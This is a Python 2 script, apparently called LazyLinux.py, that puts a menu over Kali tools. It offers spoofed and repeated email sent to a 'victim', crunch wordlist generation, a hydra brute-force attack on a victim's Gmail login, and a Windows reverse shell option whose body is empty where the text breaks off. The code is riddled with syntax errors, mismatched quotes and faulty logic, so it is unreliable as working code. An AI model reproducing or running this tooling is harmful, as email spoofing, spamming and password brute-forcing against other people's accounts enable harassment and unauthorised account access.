from os import system
from time import sleep
def choose():
   print "Select An Option:\n"
   print "1. Spoof/Spam Email"
   print "2. Fully Update Kali"
   print "3. Genarate Password List"
   print "4. Crack Gmail Password"
   print "5. Creat a Revearse Shell for Windows"
option = input(">")
while option != 1 or 2 or 3 or 4 or 5:
  print"INVALID OPTION"
  choose()
 if option == 1:
   os.system('apt-get install sendemail -y')
   print "You need a STMP server. \n If you don't have one, I suggest STMP2GO.com\n\n\n"
   print ('If you want to set any of these variables as default, edit the code in "LazyLinux.py"')
   sleep(3)
   stmpserver = raw_input("stmp server(example:stmp.stmp2go.com): ")
   stmppass = raw_input("stmp server password: ")
   spoof = raw_input ("Send From(Can be false): ")
   sendto = raw_input("Victim: ")
   sub = raw_input("Subject: ")
   mes = raw_input("Message: ")
   times = input("Times: ')
   for i in range(0, times):
       os.system('sendemail -f '+spoof+' -t '+sendto+' -s '+sub+' -m '+mes+' -xu '+stmpserver+' -xp '+stmppass')
    print("All emails sent!")
if option == 2:
    os.system('apt-get update -y')
    os.system('apt-get upgrade -y')
    os.system('apt-get dist upgrade -y')
    os.system('apt autoremove -y')
if option == 3:
  def a():
       print "Choose Type:\n"
       print "1. Numeric"
       print "2. Lowercase"
       print "3. Upercase"
       print "4. Upercase and Lowercase"
       print "5. Upercase and Numbers"
       print "6. Lowercaseand Numbers
       print "7. Alphanumeric"
       print "8. Alphnumeric and spaces"
       print "9. Alphanumeric and Symbols"
       print "10.Alphanumeric and  Symbols and Spaces"
       print "11. Custom"
   a()
   type = input(">")
   while type != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9 or 10 or 11:
                 print "\n\n\nPlease select a vallid option."
                 sleep(4)
                 a()
                 type = input(">")
   if type == 1:
                 charset = "1234567890"
   if type == 2:
                 charset = "abcdefghijklmnopqrstuvwxyz"
   if type == 3:
                 charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
   if type == 4:
                 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
   if type == 5:
                 charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
   if type == 6:
                 charset = "abcdefghijklmnopqrstuvwxyz1234567890"
   if type == 7:
                 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
   if type == 8:
                 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\ "
   if type == 9:
                 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.?!><…~|§€£¥_^[]{}"
   if type == 10:
                 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.€£¥_^[]{}§|~…<>!?\ "
   if type = 11:
                 charset = raw_input("Type all charecters to be used: ")
   print ("using charset "+charset+".")
   min = raw_input("Minimum Password Leangth: ")
   max = raw_input("Maximum Password Leangth: ")
   os.system('apt-get install crunch -y')
   os.system('crunch '+min+' '+max+' '+charset+' -o /root/Desktop/password.list')
if option == 4:
   os.system('apt-get install hydra')
   victim = raw_input("Victim: ")
   lc = raw_input("File Location of Password List: ")
   os.system('hydra -S -l '+victim+' -P '+lc+' -v -V -e ns -s 465 stmp.gmail.com stmp')
if option == 5:
                 
